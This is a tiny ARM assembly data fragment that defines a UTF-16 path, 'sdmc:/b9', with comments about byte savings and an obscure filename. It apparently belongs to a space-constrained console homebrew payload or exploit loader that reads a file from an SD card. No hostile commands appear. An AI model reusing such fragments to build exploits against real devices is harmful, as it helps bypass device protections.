filename:	
				.word 0x640073,0x63006d @ "sdmc"
colon_slash:
				.word 0x080A9000 @ ":/" during runtime anyway
end_of_all_things:
				.word 0x390062 @ "b9" our two letter filename to confuse the masses. hopefully next char is null, as Black Cat testifies.
				
				@if we need more space, we can pool the FS addresses after sdmc:/ and use those as filenames, saving 4 bytes at the expense of style.
